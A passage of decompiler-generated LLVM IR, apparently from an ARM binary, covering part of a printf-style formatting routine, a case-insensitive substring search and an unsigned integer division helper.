dec_label_pc_b2cc:                                ; preds = %dec_label_pc_b2a8
  %v7_b2cc = icmp eq i8 %v2_b294, 100
  br i1 %v7_b2cc, label %dec_label_pc_b2d4, label %dec_label_pc_b308

dec_label_pc_b2d4:                                ; preds = %dec_label_pc_b2cc
  %v0_b2e4 = load i32, i32* @r6, align 4
  store i32 %v0_b2e4, i32* @r0, align 4
  %v1_b2e8 = bitcast i8* %stack_var_-52.325 to i32*
  %v2_b2e8 = load i32, i32* %v1_b2e8, align 4
  store i32 %v2_b2e8, i32* @r1, align 4
  %v0_b2ec = load i32, i32* @sl, align 4
  store i32 %v0_b2ec, i32* @r2, align 4
  br label %dec_label_pc_b2f8

dec_label_pc_b2f8:                                ; preds = %dec_label_pc_b34c, %dec_label_pc_b32c, %dec_label_pc_b2d4
  %storemerge = phi i32 [ 1, %dec_label_pc_b2d4 ], [ %v0_b284, %dec_label_pc_b32c ], [ %v0_b284, %dec_label_pc_b34c ]
  store i32 %storemerge, i32* @r3, align 4
  %v0_b2fc = call i32 @function_b0e4()
  br label %dec_label_pc_b300

dec_label_pc_b300:                                ; preds = %dec_label_pc_b3a0, %dec_label_pc_b2f8
  %storemerge2 = phi i32 [ %v5_b3a0, %dec_label_pc_b3a0 ], [ %v0_b2fc, %dec_label_pc_b2f8 ]
  %stack_var_-52.0.in.in = ptrtoint i8* %stack_var_-52.325 to i32
  %stack_var_-52.0.in = add i32 %stack_var_-52.0.in.in, 4
  %stack_var_-52.0 = inttoptr i32 %stack_var_-52.0.in to i8*
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v0_b300 = load i32, i32* @r5, align 4
  %v2_b300 = add i32 %v0_b300, %storemerge2
  store i32 %v2_b300, i32* @r5, align 4
  br label %dec_label_pc_b3b8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b2cc
  %v7_b308 = icmp eq i8 %v2_b294, 120
  br i1 %v7_b308, label %dec_label_pc_b32c, label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308
  %v7_b31c = icmp eq i8 %v2_b294, 88
  br i1 %v7_b31c, label %dec_label_pc_b32c, label %dec_label_pc_b344

dec_label_pc_b32c:                                ; preds = %dec_label_pc_b31c, %dec_label_pc_b308
  %v1_b330 = bitcast i8* %stack_var_-52.325 to i32*
  %v2_b330 = load i32, i32* %v1_b330, align 4
  store i32 %v2_b330, i32* @r1, align 4
  %v0_b334 = load i32, i32* @r6, align 4
  store i32 %v0_b334, i32* @r0, align 4
  store i32 16, i32* @r2, align 4
  br label %dec_label_pc_b2f8

dec_label_pc_b344:                                ; preds = %dec_label_pc_b31c
  %v7_b344 = icmp eq i8 %v2_b294, 117
  br i1 %v7_b344, label %dec_label_pc_b34c, label %dec_label_pc_b374

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b344
  %v0_b35c = load i32, i32* @r6, align 4
  store i32 %v0_b35c, i32* @r0, align 4
  %v1_b360 = bitcast i8* %stack_var_-52.325 to i32*
  %v2_b360 = load i32, i32* %v1_b360, align 4
  store i32 %v2_b360, i32* @r1, align 4
  %v0_b364 = load i32, i32* @sl, align 4
  store i32 %v0_b364, i32* @r2, align 4
  br label %dec_label_pc_b2f8

dec_label_pc_b374:                                ; preds = %dec_label_pc_b344
  %v7_b374 = icmp eq i8 %v2_b294, 99
  br i1 %v7_b374, label %dec_label_pc_b37c, label %dec_label_pc_b3b8

dec_label_pc_b37c:                                ; preds = %dec_label_pc_b374
  %v1_b380 = bitcast i8* %stack_var_-52.325 to i32*
  %v2_b380 = load i32, i32* %v1_b380, align 4
  store i32 %v2_b380, i32* @lr, align 4
  store i32 %v2_b380, i32* %stack_var_-42, align 4
  br label %dec_label_pc_b3a0

dec_label_pc_b3a0:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b37c
  %v1_b3a0 = phi i32 [ %v2_b2b4, %dec_label_pc_b2b0 ], [ %v2_b22c, %dec_label_pc_b37c ]
  %storemerge3 = load i32, i32* @r6, align 4
  store i32 %storemerge3, i32* %r0.global-to-local, align 4
  %v4_b3a0 = inttoptr i32 %v1_b3a0 to i8*
  %v5_b3a0 = call i32 @function_b020(i32 %storemerge3, i8* %v4_b3a0, i32 %v1_b28c, i32 %v0_b2b8)
  br label %dec_label_pc_b300

dec_label_pc_b3a8:                                ; preds = %dec_label_pc_b240, %dec_label_pc_b254
  %v0_b3ac = phi i32 [ %v0_b248, %dec_label_pc_b240 ], [ %v1_b248, %dec_label_pc_b254 ]
  %v0_b3a8 = load i32, i32* @r6, align 4
  store i32 %v0_b3a8, i32* %r0.global-to-local, align 4
  %v1_b3ac = inttoptr i32 %v0_b3ac to i8*
  %v2_b3ac = load i8, i8* %v1_b3ac, align 1
  %v3_b3ac = zext i8 %v2_b3ac to i32
  %v2_b3b0 = inttoptr i32 %v0_b3a8 to i32*
  %v3_b3b0 = call i32 @function_afd8(i32* %v2_b3b0, i32 %v3_b3ac)
  store i32 %v3_b3b0, i32* %r0.global-to-local, align 4
  %v0_b3b4 = load i32, i32* @r5, align 4
  %v1_b3b4 = add i32 %v0_b3b4, 1
  store i32 %v1_b3b4, i32* @r5, align 4
  br label %dec_label_pc_b3b8

dec_label_pc_b3b8:                                ; preds = %dec_label_pc_b374, %dec_label_pc_b300, %dec_label_pc_b3a8
  %v0_b3d445 = phi i32 [ %v1_b3b4, %dec_label_pc_b3a8 ], [ %v2_b300, %dec_label_pc_b300 ], [ %v0_b3d446, %dec_label_pc_b374 ]
  %stack_var_-52.2 = phi i8* [ %stack_var_-52.325, %dec_label_pc_b3a8 ], [ %stack_var_-52.0, %dec_label_pc_b300 ], [ %stack_var_-52.325, %dec_label_pc_b374 ]
  %v0_b3b8 = load i32, i32* @r4, align 4
  %v1_b3b8 = add i32 %v0_b3b8, 1
  store i32 %v1_b3b8, i32* @r4, align 4
  %v1_b3bc = inttoptr i32 %v1_b3b8 to i8*
  %v2_b3bc = load i8, i8* %v1_b3bc, align 1
  %v3_b3bc = zext i8 %v2_b3bc to i32
  store i32 %v3_b3bc, i32* @r3, align 4
  %v2_b3c0 = icmp eq i8 %v2_b3bc, 0
  br i1 %v2_b3c0, label %dec_label_pc_b3c8.loopexit, label %dec_label_pc_b240

dec_label_pc_b3c8.loopexit:                       ; preds = %dec_label_pc_b3b8, %dec_label_pc_b248
  %v0_b3d412.ph = phi i32 [ %v0_b3d446, %dec_label_pc_b248 ], [ %v0_b3d445, %dec_label_pc_b3b8 ]
  %v0_b3c8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b3c8

dec_label_pc_b3c8:                                ; preds = %dec_label_pc_b3c8.loopexit, %dec_label_pc_b210
  %v0_b3c8 = phi i32 [ %v0_b21c, %dec_label_pc_b210 ], [ %v0_b3c8.pre, %dec_label_pc_b3c8.loopexit ]
  %v0_b3d412 = phi i32 [ 0, %dec_label_pc_b210 ], [ %v0_b3d412.ph, %dec_label_pc_b3c8.loopexit ]
  %v2_b3c8 = icmp eq i32 %v0_b3c8, 0
  br i1 %v2_b3c8, label %.thread8.thread, label %bb67

.thread8.thread:                                  ; preds = %dec_label_pc_b3c8
  store i32 %v0_b3d412, i32* %r0.global-to-local, align 4
  br label %bb68

bb67:                                             ; preds = %dec_label_pc_b3c8
  %v2_b3cc = inttoptr i32 %v0_b3c8 to i32*
  %v3_b3cc = load i32, i32* %v2_b3cc, align 4
  store i32 %v3_b3cc, i32* %r2.global-to-local, align 4
  store i32 %v0_b3d412, i32* %r0.global-to-local, align 4
  %v4_b3d8 = inttoptr i32 %v3_b3cc to i8*
  store i8 0, i8* %v4_b3d8, align 1
  br label %bb68

bb68:                                             ; preds = %.thread8.thread, %bb67
  store i32 %v3_b210, i32* @r4, align 4
  store i32 %v6_b210, i32* @r5, align 4
  store i32 %v9_b210, i32* @r6, align 4
  store i32 %v12_b210, i32* @r7, align 4
  store i32 %v15_b210, i32* @r8, align 4
  store i32 %v18_b210, i32* @sb, align 4
  store i32 %v21_b210, i32* @sl, align 4
  store i32 %v24_b210, i32* @fp, align 4
  ret i32 %v0_b3d412

; uselistorder directives
  uselistorder i32 %v0_b3d412, { 0, 2, 1 }
  uselistorder i32 %v0_b3c8, { 1, 0 }
  uselistorder i32 %v3_b3bc, { 1, 0 }
  uselistorder i32 %v1_b3b8, { 1, 2, 0 }
  uselistorder i32 %v0_b290, { 1, 0 }
  uselistorder i32 %v1_b274, { 0, 2, 1 }
  uselistorder i32 %v1_b270, { 0, 2, 3, 1 }
  uselistorder i32 %v0_b27813, { 1, 0, 2 }
  uselistorder i32 %storemerge48, { 1, 0, 2 }
  uselistorder i32 %v1_b248, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-52.325, { 7, 1, 6, 5, 4, 0, 3, 2 }
  uselistorder i32 %v0_b248, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 4, 7, 6, 9, 2, 8, 3, 0, 1 }
  uselistorder i8 48, { 2, 1, 0, 3 }
  uselistorder i8 45, { 1, 3, 2, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_b3b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b3a8, { 1, 0 }
  uselistorder label %dec_label_pc_b3a0, { 1, 0 }
  uselistorder label %dec_label_pc_b294, { 1, 0 }
  uselistorder label %dec_label_pc_b270, { 1, 0 }
  uselistorder label %dec_label_pc_b278.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b240, { 1, 0 }
}

define i32 @function_b3e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b3e8:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v9_b3e8 = load i32, i32* @r3, align 4
  %v0_b3ec = load i32, i32* @lr, align 4
  %v2_b3f4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v11_b40c = call i32 @function_b210(i32* nonnull %stack_var_-28, i32 %arg2, i32 %v2_b3f4, i32 %v2_b3f4, i32 %arg1, i32 %v2_b3f4, i32 %v0_b3ec, i32 %arg2, i32 %arg3, i32 %v9_b3e8)
  store i32 %v0_b3ec, i32* @lr, align 4
  ret i32 %v11_b40c

; uselistorder directives
  uselistorder i32 %v2_b3f4, { 2, 0, 1 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_b420(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b420:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_b43811 = inttoptr i32 %arg2 to i8*
  %v4_b43812 = load i8, i8* %v3_b43811, align 1
  %v6_b43813 = zext i8 %v4_b43812 to i32
  store i32 %v6_b43813, i32* @r3, align 4
  %v2_b43c14 = icmp eq i8 %v4_b43812, 0
  br i1 %v2_b43c14, label %dec_label_pc_b444, label %dec_label_pc_b434

dec_label_pc_b434:                                ; preds = %dec_label_pc_b420, %dec_label_pc_b434
  %v0_b434 = phi i32 [ %v1_b434, %dec_label_pc_b434 ], [ 0, %dec_label_pc_b420 ]
  %v1_b434 = add i32 %v0_b434, 1
  %v2_b438 = add i32 %v1_b434, %arg2
  %v3_b438 = inttoptr i32 %v2_b438 to i8*
  %v4_b438 = load i8, i8* %v3_b438, align 1
  %v6_b438 = zext i8 %v4_b438 to i32
  store i32 %v6_b438, i32* @r3, align 4
  %v2_b43c = icmp eq i8 %v4_b438, 0
  br i1 %v2_b43c, label %dec_label_pc_b444, label %dec_label_pc_b434

dec_label_pc_b444:                                ; preds = %dec_label_pc_b434, %dec_label_pc_b420
  %v1_b48431 = phi i32 [ 0, %dec_label_pc_b420 ], [ %v1_b434, %dec_label_pc_b434 ]
  %v0_b444 = phi i32 [ %v6_b43813, %dec_label_pc_b420 ], [ %v6_b438, %dec_label_pc_b434 ]
  %v0_b4902 = load i32, i32* @r1, align 4
  %tmp42 = icmp slt i32 %v0_b4902, 1
  br i1 %tmp42, label %dec_label_pc_b4a0, label %dec_label_pc_b454

dec_label_pc_b454:                                ; preds = %dec_label_pc_b444, %dec_label_pc_b490.backedge
  %v0_b494.in = phi i32 [ %v0_b494, %dec_label_pc_b490.backedge ], [ %v0_b4902, %dec_label_pc_b444 ]
  %v1_b460 = phi i32 [ %v1_b46022, %dec_label_pc_b490.backedge ], [ %v0_b444, %dec_label_pc_b444 ]
  %v0_b454 = phi i32 [ %v5_b454, %dec_label_pc_b490.backedge ], [ %tmp, %dec_label_pc_b444 ]
  %v0_b494 = add i32 %v0_b494.in, -1
  %v1_b454 = inttoptr i32 %v0_b454 to i8*
  %v2_b454 = load i8, i8* %v1_b454, align 1
  %v3_b454 = zext i8 %v2_b454 to i32
  %v5_b454 = add i32 %v0_b454, 1
  %v1_b458 = add nsw i32 %v3_b454, -65
  %v2_b460 = add i32 %v1_b460, %arg2
  %v3_b460 = inttoptr i32 %v2_b460 to i8*
  %v4_b460 = load i8, i8* %v3_b460, align 1
  %v6_b460 = zext i8 %v4_b460 to i32
  store i32 %v6_b460, i32* @r3, align 4
  %v1_b464 = add nsw i32 %v6_b460, -65
  %tmp51 = icmp ult i32 %v1_b458, 26
  br i1 %tmp51, label %bb, label %bb43

bb:                                               ; preds = %dec_label_pc_b454
  %v5_b468 = or i32 %v3_b454, 96
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_b454, %bb
  %v0_b474 = phi i32 [ %v3_b454, %dec_label_pc_b454 ], [ %v5_b468, %bb ]
  %tmp52 = icmp ult i32 %v1_b464, 26
  br i1 %tmp52, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  %v5_b470 = or i32 %v6_b460, 96
  store i32 %v5_b470, i32* @r3, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_b474 = phi i32 [ %v6_b460, %bb43 ], [ %v5_b470, %bb44 ]
  %v9_b474 = icmp eq i32 %v0_b474, %v1_b474
  br i1 %v9_b474, label %dec_label_pc_b480, label %bb46

bb46:                                             ; preds = %bb45
  br label %dec_label_pc_b490.backedge

dec_label_pc_b480:                                ; preds = %bb45
  %v1_b480 = add i32 %v1_b460, 1
  %v9_b484 = icmp eq i32 %v1_b480, %v1_b48431
  br i1 %v9_b484, label %dec_label_pc_b4a0.loopexit, label %dec_label_pc_b490.backedge

dec_label_pc_b490.backedge:                       ; preds = %bb46, %dec_label_pc_b480
  %v1_b46022 = phi i32 [ %v0_b444, %bb46 ], [ %v1_b480, %dec_label_pc_b480 ]
  %tmp47 = icmp slt i32 %v0_b494, 1
  br i1 %tmp47, label %dec_label_pc_b4a0, label %dec_label_pc_b454

dec_label_pc_b4a0.loopexit:                       ; preds = %dec_label_pc_b480
  %v3_b488 = sub i32 %v5_b454, %tmp
  br label %dec_label_pc_b4a0

dec_label_pc_b4a0:                                ; preds = %dec_label_pc_b490.backedge, %dec_label_pc_b444, %dec_label_pc_b4a0.loopexit
  %storemerge = phi i32 [ %v3_b488, %dec_label_pc_b4a0.loopexit ], [ -1, %dec_label_pc_b444 ], [ -1, %dec_label_pc_b490.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_b454, { 1, 0 }
  uselistorder i32 %v1_b460, { 1, 0 }
  uselistorder i32 %v0_b444, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_b4a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b490.backedge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_b454, { 1, 0 }
  uselistorder label %dec_label_pc_b434, { 1, 0 }
}

define i32 @function_b4a8() local_unnamed_addr {
dec_label_pc_b4a8:
  %r2.global-to-local = alloca i32, align 4
  %v0_b4a8 = load i32, i32* @r1, align 4
  %v1_b4a8 = add i32 %v0_b4a8, -1
  store i32 %v1_b4a8, i32* %r2.global-to-local, align 4
  %v2_b4a8 = icmp eq i32 %v0_b4a8, 0
  %v7_b4a8 = icmp eq i32 %v0_b4a8, 1
  %v0_b4ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_b4a8, i32 %v0_b4ac)
  br i1 %v2_b4a8, label %dec_label_pc_b590, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b4a8
  %v0_b4b4 = load i32, i32* @r0, align 4
  %v1_b4b4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_b4b4, %v1_b4b4
  br i1 %tmp, label %dec_label_pc_b4bc, label %dec_label_pc_b548

dec_label_pc_b4bc:                                ; preds = %dec_label_pc_b4b4
  %v1_b4bc = load i32, i32* %r2.global-to-local, align 4
  %v2_b4bc = and i32 %v1_b4bc, %v1_b4b4
  %v4_b4bc = icmp eq i32 %v2_b4bc, 0
  br i1 %v4_b4bc, label %dec_label_pc_b554, label %dec_label_pc_b4c4

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4bc
  %v3_b4c4 = icmp ult i32 %v1_b4b4, 536870912
  br i1 %v3_b4c4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_b4c4
  %v4_b4c8 = mul i32 %v1_b4b4, 8
  store i32 %v4_b4c8, i32* @r1, align 4
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_b4c4, %.thread
  %v0_b4e8.pr36.ph = phi i32 [ %v4_b4c8, %.thread ], [ %v1_b4b4, %dec_label_pc_b4c4 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_b4c4 ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_b4e8.pr36 = phi i32 [ %v4_b4dc, %bb81 ], [ %v0_b4e8.pr36.ph, %.preheader.preheader ]
  %v1_b4e0 = phi i32 [ %v4_b4e0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_b4d4 = icmp ugt i32 %v0_b4e8.pr36, 268435455
  br i1 %v2_b4d4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_b4e8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_b4d8 = icmp ult i32 %v0_b4e8.pr36, %v0_b4b4
  br i1 %v4_b4d8, label %bb80, label %dec_label_pc_b4e8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_b4dc = and i32 %v0_b4e8.pr36, 268435456
  %v3_b4dc = icmp eq i32 %v2_b4dc, 0
  %v4_b4dc = mul i32 %v0_b4e8.pr36, 16
  store i32 %v4_b4dc, i32* @r1, align 4
  br i1 %v3_b4dc, label %bb81, label %dec_label_pc_b4e8.loopexit

bb81:                                             ; preds = %bb80
  %v2_b4e0 = and i32 %v1_b4e0, 268435456
  %v3_b4e0 = icmp eq i32 %v2_b4e0, 0
  %v4_b4e0 = mul i32 %v1_b4e0, 16
  store i32 %v4_b4e0, i32* @r3, align 4
  br i1 %v3_b4e0, label %.preheader, label %dec_label_pc_b4e8thread-pre-split.loopexit.loopexit

dec_label_pc_b4e8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_b4f448.ph = phi i32 [ %v1_b4e0, %bb ], [ %v4_b4e0, %bb81 ]
  %v0_b4e8.pr38.ph = phi i32 [ %v0_b4e8.pr36, %bb ], [ %v4_b4dc, %bb81 ]
  br label %dec_label_pc_b4e8thread-pre-split.loopexit

dec_label_pc_b4e8thread-pre-split.loopexit:       ; preds = %dec_label_pc_b4e8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_b4f448 = phi i32 [ %v1_b4e0, %.thread2 ], [ %v1_b4f448.ph, %dec_label_pc_b4e8thread-pre-split.loopexit.loopexit ]
  %v0_b4e8.pr38 = phi i32 [ %v0_b4e8.pr36, %.thread2 ], [ %v0_b4e8.pr38.ph, %dec_label_pc_b4e8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_b4e8thread-pre-split

dec_label_pc_b4e8thread-pre-split:                ; preds = %dec_label_pc_b4e8thread-pre-split.loopexit, %bb83
  %v1_b4f446 = phi i32 [ %v1_b4f448, %dec_label_pc_b4e8thread-pre-split.loopexit ], [ %v3_b4f4, %bb83 ]
  %v0_b4e8.pr = phi i32 [ %v0_b4e8.pr38, %dec_label_pc_b4e8thread-pre-split.loopexit ], [ %v3_b4f0, %bb83 ]
  br label %dec_label_pc_b4e8

dec_label_pc_b4e8.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b4e8.loopexit, %dec_label_pc_b4e8thread-pre-split
  %v1_b4f4 = phi i32 [ %v1_b4f446, %dec_label_pc_b4e8thread-pre-split ], [ %v1_b4e0, %dec_label_pc_b4e8.loopexit ]
  %v1_b4f0 = phi i32 [ %v0_b4e8.pr, %dec_label_pc_b4e8thread-pre-split ], [ %v4_b4dc, %dec_label_pc_b4e8.loopexit ]
  %v2_b4e8 = icmp slt i32 %v1_b4f0, 0
  br i1 %v2_b4e8, label %dec_label_pc_b4fc, label %bb82

bb82:                                             ; preds = %dec_label_pc_b4e8
  %v4_b4ec = icmp ult i32 %v1_b4f0, %v0_b4b4
  br i1 %v4_b4ec, label %bb83, label %dec_label_pc_b4fc

bb83:                                             ; preds = %bb82
  %v3_b4f0 = mul i32 %v1_b4f0, 2
  store i32 %v3_b4f0, i32* @r1, align 4
  %v2_b4f4 = icmp slt i32 %v1_b4f4, 0
  %v3_b4f4 = mul i32 %v1_b4f4, 2
  store i32 %v3_b4f4, i32* @r3, align 4
  br i1 %v2_b4f4, label %dec_label_pc_b4fc, label %dec_label_pc_b4e8thread-pre-split

dec_label_pc_b4fc:                                ; preds = %bb82, %dec_label_pc_b4e8, %bb83
  %v2_b50859 = phi i32 [ %v3_b4f4, %bb83 ], [ %v1_b4f4, %bb82 ], [ %v1_b4f4, %dec_label_pc_b4e8 ]
  %v1_b50051 = phi i32 [ %v3_b4f0, %bb83 ], [ %v1_b4f0, %bb82 ], [ %v1_b4f0, %dec_label_pc_b4e8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b500

dec_label_pc_b500:                                ; preds = %.thread11, %dec_label_pc_b4fc
  %v1_b534 = phi i32 [ %v4_b534, %.thread11 ], [ %v2_b50859, %dec_label_pc_b4fc ]
  %v1_b508 = phi i32 [ %v0_b540, %.thread11 ], [ 0, %dec_label_pc_b4fc ]
  %v1_b538 = phi i32 [ %v4_b538, %.thread11 ], [ %v1_b50051, %dec_label_pc_b4fc ]
  %v1_b504 = phi i32 [ %v0_b530, %.thread11 ], [ %v0_b4b4, %dec_label_pc_b4fc ]
  %v3_b500 = icmp ult i32 %v1_b504, %v1_b538
  br i1 %v3_b500, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_b500
  %v3_b504 = sub i32 %v1_b504, %v1_b538
  %v3_b508 = or i32 %v1_b508, %v1_b534
  store i32 %v3_b508, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_b500, %bb84
  %v1_b510 = phi i32 [ %v1_b504, %dec_label_pc_b500 ], [ %v3_b504, %bb84 ]
  %v1_b514 = phi i32 [ %v1_b508, %dec_label_pc_b500 ], [ %v3_b508, %bb84 ]
  %v4_b50c = udiv i32 %v1_b538, 2
  %v6_b50c = icmp ult i32 %v1_b510, %v4_b50c
  br i1 %v6_b50c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_b510 = urem i32 %v1_b538, 2
  %v4_b510 = icmp eq i32 %v3_b510, 0
  %v6_b510 = sub i32 %v1_b510, %v4_b50c
  br i1 %v4_b510, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_b514 = udiv i32 %v1_b534, 2
  %v6_b514 = or i32 %v1_b514, %v5_b514
  store i32 %v6_b514, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_b51c = phi i32 [ %v6_b510, %bb85 ], [ %v1_b510, %.thread7 ], [ %v6_b510, %bb86 ]
  %v1_b520 = phi i32 [ %v1_b514, %bb85 ], [ %v1_b514, %.thread7 ], [ %v6_b514, %bb86 ]
  %v4_b518 = udiv i32 %v1_b538, 4
  %v6_b518 = icmp ult i32 %v1_b51c, %v4_b518
  br i1 %v6_b518, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_b51c = and i32 %v1_b538, 2
  %v4_b51c = icmp eq i32 %v3_b51c, 0
  %v6_b51c = sub i32 %v1_b51c, %v4_b518
  br i1 %v4_b51c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_b520 = udiv i32 %v1_b534, 4
  %v6_b520 = or i32 %v1_b520, %v5_b520
  store i32 %v6_b520, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_b528 = phi i32 [ %v6_b51c, %bb87 ], [ %v1_b51c, %.thread8 ], [ %v6_b51c, %bb88 ]
  %v1_b52c = phi i32 [ %v1_b520, %bb87 ], [ %v1_b520, %.thread8 ], [ %v6_b520, %bb88 ]
  %v4_b524 = udiv i32 %v1_b538, 8
  %v6_b524 = icmp ult i32 %v1_b528, %v4_b524
  br i1 %v6_b524, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_b528 = and i32 %v1_b538, 4
  %v4_b528 = icmp eq i32 %v3_b528, 0
  %v6_b528 = sub i32 %v1_b528, %v4_b524
  br i1 %v4_b528, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_b52c = udiv i32 %v1_b534, 8
  %v6_b52c = or i32 %v1_b52c, %v5_b52c
  store i32 %v6_b52c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_b540 = phi i32 [ %v1_b52c, %bb89 ], [ %v1_b52c, %.thread9 ], [ %v6_b52c, %bb90 ]
  %v0_b530 = phi i32 [ %v6_b528, %bb89 ], [ %v1_b528, %.thread9 ], [ %v6_b528, %bb90 ]
  %v2_b530 = icmp eq i32 %v0_b530, 0
  br i1 %v2_b530, label %dec_label_pc_b540, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_b534 = udiv i32 %v1_b534, 16
  store i32 %v4_b534, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_b534, 16
  br i1 %tmp138, label %dec_label_pc_b540, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_b538 = udiv i32 %v1_b538, 16
  store i32 %v4_b538, i32* @r1, align 4
  br label %dec_label_pc_b500

dec_label_pc_b540:                                ; preds = %thread-pre-split, %bb91
  ret i32 %v0_b540

dec_label_pc_b548:                                ; preds = %dec_label_pc_b4b4
  %v9_b4b4 = icmp eq i32 %v0_b4b4, %v1_b4b4
  %. = zext i1 %v9_b4b4 to i32
  ret i32 %.

dec_label_pc_b554:                                ; preds = %dec_label_pc_b4bc
  %v2_b554 = icmp ugt i32 %v1_b4b4, 65535
  br i1 %v2_b554, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_b554
  %v2_b558 = and i32 %v1_b4b4, 32768
  %v3_b558 = icmp eq i32 %v2_b558, 0
  %v4_b558 = udiv i32 %v1_b4b4, 65536
  store i32 %v4_b558, i32* @r1, align 4
  br i1 %v3_b558, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_b554
  %v0_b56465 = phi i32 [ %v1_b4b4, %dec_label_pc_b554 ], [ %v4_b558, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_b568 = phi i32 [ %v0_b56465, %.thread16 ], [ %v4_b558, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_b564 = icmp ugt i32 %v1_b568, 255
  br i1 %v2_b564, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_b568 = and i32 %v1_b568, 128
  %v3_b568 = icmp eq i32 %v2_b568, 0
  %v4_b568 = udiv i32 %v1_b568, 256
  store i32 %v4_b568, i32* @r1, align 4
  br i1 %v3_b568, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_b56c = or i32 %storemerge, 8
  store i32 %v2_b56c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_b578 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_b56c, %bb98 ]
  %v1_b574 = phi i32 [ %v1_b568, %bb96 ], [ %v4_b568, %bb97 ], [ %v4_b568, %bb98 ]
  %v2_b570 = icmp ugt i32 %v1_b574, 15
  br i1 %v2_b570, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_b574 = and i32 %v1_b574, 8
  %v3_b574 = icmp eq i32 %v2_b574, 0
  %v4_b574 = udiv i32 %v1_b574, 16
  store i32 %v4_b574, i32* @r1, align 4
  br i1 %v3_b574, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_b578 = add nsw i32 %v1_b578, 4
  store i32 %v2_b578, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_b580 = phi i32 [ %v1_b578, %.thread17 ], [ %v1_b578, %bb99 ], [ %v2_b578, %bb100 ]
  %v5_b584 = phi i32 [ %v1_b574, %.thread17 ], [ %v4_b574, %bb99 ], [ %v4_b574, %bb100 ]
